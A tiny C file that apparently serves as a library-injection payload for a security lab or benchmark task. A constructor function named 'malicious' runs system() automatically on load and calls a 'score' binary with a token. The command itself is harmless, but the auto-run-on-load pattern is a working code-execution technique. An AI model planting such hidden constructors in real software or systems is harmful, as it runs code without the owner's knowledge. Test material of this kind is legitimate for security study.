#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
	 
void malicious() {
    system("/usr/local/bin/score 47a6a838-729b-4366-ae4b-663d5889b452");
}
